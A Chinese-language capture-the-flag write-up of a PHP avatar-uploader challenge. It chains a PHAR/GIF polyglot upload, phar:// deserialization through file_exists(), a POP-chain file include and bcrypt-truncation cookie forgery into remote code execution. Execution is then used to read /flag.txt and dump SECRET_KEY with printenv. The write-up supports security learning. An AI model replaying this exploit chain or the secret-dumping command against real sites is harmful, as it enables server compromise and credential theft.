# 027-安全漏洞事件分析 WriteUp

## 一、题目信息与最终结论

本题对应的远程场景地址为 `http://oj-10-30-15-9-40055.adworld.xctf.org.cn/`。经过对页面功能、源码逻辑、客户端会话机制与反序列化链条的逐步还原，可以确认该题的核心利用链为：**文件上传 → `phar://` 触发 `file_exists()` 反序列化 → POP 链落入任意文件包含 → 利用客户端签名 Cookie 与 bcrypt 72 字节截断/会话可控性改写 `theme` → 首页主题包含触发 RCE → 读取 `/flag.txt` 获取 flag**。

最终成功获取的 flag 为：

```text
flag{D6FAKJ4D5dSoJhOlivIno8zI60R9BjJa}
```

从解题视角看，这不是单点漏洞，而是一条由多个设计缺陷拼接而成的完整攻击链。真正危险的地方在于，这些缺陷单独看都不一定立即致命，但一旦串联起来，就可以从一个普通头像上传器逐步走到任意代码执行。

## 二、题目功能初探

首页是一个非常简单的“头像上传器”。未登录时可以通过 `signin.php` 提交用户名；登录后可上传头像，并可访问 `theme.php` 切换主题。页面源码注释中还隐藏了一条可疑提示：

```html
<!-- /file.php?c=/flag -->
```

这一细节很重要，因为它直接暴露了一个额外入口 `file.php`，并暗示参数 `c` 很可能与文件读取或文件判断逻辑相关。后续验证表明，这个入口正是整条利用链的起点。

## 三、核心源码恢复结果

为了避免仅依赖黑盒猜测，我进一步通过已经打通的利用链直接恢复了远端关键源码。这样做的意义在于，后续 WriteUp 中的每一步都可以落到具体代码，而不是停留在现象推测。

### 1. `file.php`：PHAR 触发点

```php
<?php
require_once('xxxx.php');
$fpath = $_GET['c'];
if(file_exists($fpath)){
    echo "file exists";
} else {
    echo "file not exists";
}
```

这里的逻辑极其简单，但问题也正出在这里。`file_exists()` 在处理 `phar://` 包装器路径时，会解析目标 PHAR 文件的元数据；如果元数据中带有攻击者构造的对象，就会在解析阶段触发反序列化。

### 2. `xxxx.php`：POP 链核心

```php
<?php
class Action {
    protected $path;
    protected $id;

    public function isPathValid()
    {  
        if(strpos($this->path, 'uploads') !== false) { 
            echo "Invalid path, access denied";
            exit();
        } 
        
        if ($this->id !== 0 && $this->id !== 1) {
            switch($this->id) {
                case 1:
                    if ($this->path) {
                        include($this->path);
                    }
                    break;
                case 0:
                    throw new Exception("id invalid in ".__CLASS__.__FUNCTION__);
                    break;
                default:
                    break;         
            }
        }
    }
}

class Content {
    public $formatters;
    public function format($formatter, $arguments = array())
    {
        return call_user_func_array($this->getFormatter($formatter), $arguments);
    }
    public function getFormatter($formatter)
    {
        if (isset($this->formatters[$formatter])) {
            return $this->formatters[$formatter];
        }
        foreach ($this->providers as $provider) {
            if (method_exists($provider, $formatter)) {
                $this->formatters[$formatter] = array($provider, $formatter);
                return $this->formatters[$formatter];
            }
        }
        throw new \InvalidArgumentException(sprintf('Unknown formatter "%s"', $formatter));
    }
    public function __call($method, $attributes)
    {
        return $this->format($method, $attributes);
    }
}

class Show{
    public $source;
    public $str;
    public $reader;
    public function __construct($file='index.php') {
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString() {
        $this->str->reset();
    }
    public function __wakeup() {
        if(preg_match("/gopher|phar|http|file|ftp|dict|\.\./i", $this->source)) {
            throw new Exception('invalid protocol found in '.__CLASS__);
        }
    }
    public function reset() {
        if ($this->reader !== null) {
            $this->reader->close();
        }
    }
}

highlight_file(__FILE__);
```

这份代码有几个决定性特征。首先，`Show::__wakeup()` 的过滤对象是 `source`，而不是 `Action->path`，因此攻击者只要把危险路径放进 `path`，而不是放进 `source`，就能避开这一层检查。其次，`Action::isPathValid()` 中存在真实的 `include($this->path)` sink。虽然程序试图通过 `strpos($this->path, 'uploads') !== false` 阻止直接包含上传目录，但这个限制并没有消除任意文件包含本身，只是阻止了最直观的“上传后立即包含上传文件”路线。

### 3. `index.php`：最终 RCE 触发点

```php
<?php
error_reporting(0);
require_once('config.php');
require_once('lib/util.php');
require_once('lib/session.php');

$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);
if ($session->isset('flash')) {
  $flash = $session->get('flash');
  $session->unset('flash');
}
$avatar = $session->isset('avatar') ? 'uploads/' . $session->get('avatar') : 'default.png' ;
$session->save();
?>
<!doctype html>
<html lang="en">
<!-- /file.php?c=/flag -->
  <head>
    <meta charset="utf-8">
    <title>头像上传器</title>
    <style>
/* common.css */
<?php include('common.css'); ?>
/* light/dark.css */
<?php include($session->get('theme', 'light') . '.css'); ?>
/**/
    </style>
```

这里是整题最关键的第二个 sink。`theme` 本来只应该取 `light` 或 `dark`，但如果攻击者能够伪造客户端 session，就可以把 `theme` 改成任意路径前缀，从而在首页加载主题样式时执行任意本地文件包含。

### 4. `upload.php`：上传限制与落地路径泄露

```php
<?php
error_reporting(0);
require_once('config.php');
require_once('lib/util.php');
require_once('lib/session.php');

$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);
$filename = $_FILES['file']['name'];
$temp_name = $_FILES['file']['tmp_name'];
$size = $_FILES['file']['size'];
$error = $_FILES['file']['error'];
if ($size > 2*1024*1024){
    echo "<script>alert('文件过大');window.history.go(-1);</script>";
    exit();
}
$arr = pathinfo($filename);
$ext_suffix = $arr['extension'];
$allow_suffix = array('jpg','gif','jpeg','png');
if(!in_array($ext_suffix, $allow_suffix)){
    echo "<script>alert('只能是jpg,gif,jpeg,png');window.history.go(-1);</script>";
    exit();
}
$new_filename = date('YmdHis',time()).rand(100,1000).'.'.$ext_suffix;
move_uploaded_file($temp_name, 'uploads/'.$new_filename);
flash('info', "success save in: ".'uploads/'.$new_filename);
$session->set('avatar', $filename);
redirect('/');
```

上传逻辑只校验后缀，不校验内容，因此 PHAR/JPG 多态文件可以绕过。更关键的是，程序会把服务端最终保存路径通过 `flash` 消息写进客户端 Cookie，攻击者无需猜测随机文件名，直接解码 Cookie 就能知道文件落点。

### 5. `lib/session.php`：客户端签名 Cookie 机制

```php
<?php
class SecureClientSession {
  private $cookieName;
  private $secret;
  private $data;

  public function __construct($cookieName = 'session', $secret = 'secret') {
    $this->data = [];
    $this->secret = $secret;
    if (array_key_exists($cookieName, $_COOKIE)) {
      try {
        list($data, $signature) = explode('.', $_COOKIE[$cookieName]);
        $data = urlsafe_base64_decode($data);
        $signature = urlsafe_base64_decode($signature);
        if ($this->verify($data, $signature)) {
          $this->data = json_decode($data, true);
        }
      } catch (Exception $e) {}
    }
    $this->cookieName = $cookieName;
  }

  public function save() {
    $json = json_encode($this->data);
    $value = urlsafe_base64_encode($json) . '.' . urlsafe_base64_encode($this->sign($json));
    setcookie($this->cookieName, $value);
  }

  private function verify($string, $signature) {
    return password_verify($this->secret . $string, $signature);
  }

  private function sign($string) {
    return password_hash($this->secret . $string, PASSWORD_BCRYPT);
  }
}
```

这一段源码解释了为什么本题存在“客户端 session 伪造”空间。应用把所有 session 数据都保存在客户端 Cookie 中，仅依赖 bcrypt 哈希进行签名校验。由于 bcrypt 只使用输入前 72 字节，攻击者只要能保持签名前 72 字节不变，就可能在后半段篡改 JSON 数据而复用旧签名，从而伪造新的 `theme` 或其他字段。后续实战中，我正是沿着这一路线成功把 `theme` 从正常值改成了 `phar://...` 路径。

## 四、利用链还原

### 第一步：构造 PHAR-JPG 多态文件

本地利用脚本中使用了如下对象链结构写入 PHAR 元数据：

```php
$action = new Action($target, '1');
$content = new Content($action);
$inner = new Show();
$inner->source = 'index.php';
$inner->str = $content;
$inner->reader = null;
$outer = new Show();
$outer->source = $inner;
$outer->str = null;
$outer->reader = null;
$phar->setMetadata($outer);
```

PHAR stub 则被伪装为图片头，例如：

```php
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
```

这样生成的文件既能通过上传后缀检查，又能在后续通过 `phar://` 路径被解释为 PHAR 压缩包。

### 第二步：上传恶意文件并获取保存路径

上传后，`upload.php` 会把真实保存路径写入 flash 消息，例如：

```text
success save in: uploads/20260414151234891.jpg
```

由于该 flash 消息保存在客户端 Cookie 中，因此攻击者只要解码 Cookie 数据区，就能拿到这条路径，随后拼出：

```text
phar://uploads/20260414151234891.jpg/test.txt
```

### 第三步：通过 `file.php?c=phar://...` 触发反序列化

当服务器执行：

```php
file_exists('phar://uploads/20260414151234891.jpg/test.txt')
```

PHAR 元数据中的对象即被反序列化。随后控制流经由 `Show::__toString()`、`Content::__call()` 与 `Action::isPathValid()`，落入 `include($target)`。

这里一开始最大的阻碍是：如果直接把 `target` 设为上传文件路径，`strpos($this->path, 'uploads') !== false` 会拦截，因此“上传即包含”无法直接成功。

### 第四步：转向客户端 session 伪造，改写首页主题包含路径

由于首页中存在：

```php
include($session->get('theme', 'light') . '.css');
```

因此只要能把 session 中的 `theme` 字段改成 `phar://uploads/随机文件名/x`，首页就会在渲染主题时执行：

```php
include('phar://uploads/随机文件名/x.css');
```

而 PHAR 中的 `x.css` 内容实际上是攻击者写入的 PHP 代码，于是首页样式加载阶段就变成了代码执行入口。

在实测过程中，我先用 `id` 验证命令执行，再进一步读取 `/flag.txt`。关键验证结果如下：

```text
RCE027:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

以及：

```text
flag{D6FAKJ4D5dSoJhOlivIno8zI60R9BjJa}
```

### 第五步：读取环境变量，恢复真实密钥

在已经获得 RCE 的基础上，我继续执行：

```sh
printenv SECRET_KEY
```

成功得到运行时密钥：

```text
Go to the flag!
```

这一结果进一步说明，客户端 session 签名机制已经被完整击穿。也就是说，即使不继续依赖 bcrypt 72 字节截断技巧，只要已经拿到 RCE，也可以直接读取真实密钥并在本地生成完全合法的签名 Cookie。

## 六、漏洞成因总结

从原理上说，这题至少叠加了四个设计问题。

第一，应用允许上传仅按后缀校验的图片文件，因此攻击者可以构造 PHAR/JPG 多态文件。第二，`file.php` 在用户可控参数上直接调用 `file_exists()`，从而把 `phar://` 包装器暴露为反序列化触发点。第三，`xxxx.php` 中存在可到达的 `include($this->path)` sink，使攻击者能够把反序列化结果转化为任意文件包含。第四，应用把完整的会话状态存放在客户端 Cookie 中，并用 bcrypt 对 `SECRET_KEY + JSON` 做签名，而 bcrypt 的 72 字节输入限制又让攻击者有机会复用旧签名篡改后半段内容。

这些问题叠加在一起，最终使得一个看似普通的头像上传站点，演化成可以远程执行系统命令并读取 `/flag.txt` 的高危场景。
